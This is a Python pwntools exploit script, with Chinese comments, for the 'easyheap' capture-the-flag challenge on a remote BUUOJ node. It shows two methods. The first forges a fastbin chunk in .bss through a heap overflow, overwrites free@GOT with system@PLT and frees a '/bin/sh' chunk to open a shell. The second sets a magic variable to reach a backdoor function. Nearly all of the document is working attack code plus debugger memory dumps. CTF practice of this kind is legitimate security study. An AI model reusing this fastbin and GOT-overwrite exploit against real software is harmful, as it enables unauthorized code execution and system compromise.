from pwn import *

'''
思路：通过堆溢出来控制任意地址chunk分配，然后修改magic变量使其符合要求，最终执行后门函数获取flag
'''

p = remote('node4.buuoj.cn', 25802)
# p = process('./eas    yheap')
# gdb.attach(p)

# 对应于服务端的函数
def malloc(size: int):
    p.sendline(b'1')
    p.recvuntil(b'Size of Heap : ')
    p.sendline(str(size).encode())
    p.recvuntil(b'Content of heap:')
    p.sendline(b'a')
    
def writeHeap(index: int, size: int, content: bytes):
    p.sendline(b'2')
    p.recvuntil(b'Index :')
    p.sendline(str(index).encode())
    p.recvuntil(b'Size of Heap : ')
    p.sendline(str(size).encode())
    p.recvuntil(b'Content of heap : ')
    p.sendline(content)

def deleteHeap(index:int):
    p.sendline(b'3')
    p.recvuntil(b'Index :')
    p.sendline(str(index).encode())

# def exit():

heap_array = 0x6020e0
magic_addr = 0x6020c0
l33t_func = 0x400c23

free_got = ELF('./easyheap').got['free']
system_plt = ELF('./easyheap').plt['system']

def exp1():
    '''
    method 1: \\
    checksec结果 RELRO:    Partial RELRO 表示got表可写\\
    所以第一种方法为：修改free@got为system@plt，然后free一个写有'/bin/sh\x00'字符串的堆，获取shell
    '''
    malloc(0x60) # id 0
    malloc(0x60) # id 1
    malloc(0x60) # id 2
    malloc(0x60) # id 3
    malloc(0x60) # id 4

    deleteHeap(2)

    '''
    pwndbg> x /20wx 0x6020a0-3
    0x60209d:       0x20000000      0xfff7dd26      0x0000007f      0x00000000
    0x6020ad:       0xe0000000      0xfff7dd18      0x0000007f      0x00000000
    0x6020bd:       0x00000000      0x00000000      0x00000000      0x00000000
    0x6020cd:       0x00000000      0x00000000      0x00000000      0x00000000
    0x6020dd:       0x00000000      0x00000000      0x00000000      0x00000000
    '''

    # 伪造fastbin中位于bss段的chunk
    payload1 = b'a'*0x60 + p64(0) + p64(0x7f) + p64(0x6020b0-3)
    writeHeap(1, len(payload1), payload1)

    malloc(0x60) # id 2
    malloc(0x60) # id 5, allocated ob bss, user memory starts at 0x6020b0-3+0x10

    # 覆盖heaparray内容，改写id 0地址为free@got
    payload2 = b'a'*(3 + 0x20)+p64(free_got)
    writeHeap(5, len(payload2), payload2)

    # 修改free@got内容为system@plt
    writeHeap(0, 8, p64(system_plt))

    # 执行free
    malloc(0x60) # id 6
    payload3 = b'/bin/sh\x00'
    writeHeap(6, len(payload3), payload3)
    deleteHeap(6)

    p.interactive()

def exp2():
    '''
    method 2: \\
    修改bss段magic变量值，满足要求，执行`l33t()`后门函数，但是BUU上并没有对应文件
    '''
    malloc(0x60) # id 0
    malloc(0x60) # id 1
    malloc(0x60) # id 2
    malloc(0x60) # id 3
    malloc(0x60) # id 4

    deleteHeap(2)

    '''
    pwndbg> x /20wx 0x6020a0-3
    0x60209d:       0x20000000      0xfff7dd26      0x0000007f      0x00000000
    0x6020ad:       0xe0000000      0xfff7dd18      0x0000007f      0x00000000
    0x6020bd:       0x00000000      0x00000000      0x00000000      0x00000000
    0x6020cd:       0x00000000      0x00000000      0x00000000      0x00000000
    0x6020dd:       0x00000000      0x00000000      0x00000000      0x00000000
    '''

    # 伪造fastbin中位于bss段的chunk
    payload1 = b'a'*0x60 + p64(0) + p64(0x7f) + p64(0x6020b0-3)
    writeHeap(1, len(payload1), payload1)

    malloc(0x60) # id 2
    malloc(0x60) # id 5, allocated ob bss, user memory starts at 0x6020b0-3+0x10

    payload2 = b'a'*3 + p64(0x1306)
    writeHeap(5, len(payload2), payload2)
    p.recvuntil(b'Your choice :')
    p.sendline(b'4869')
    p.interactive()

if __name__ == '__main__':
    exp2()
    '''
    Your choice :Congrt !
    cat: /home/pwn/flag: No such file or directory
    '''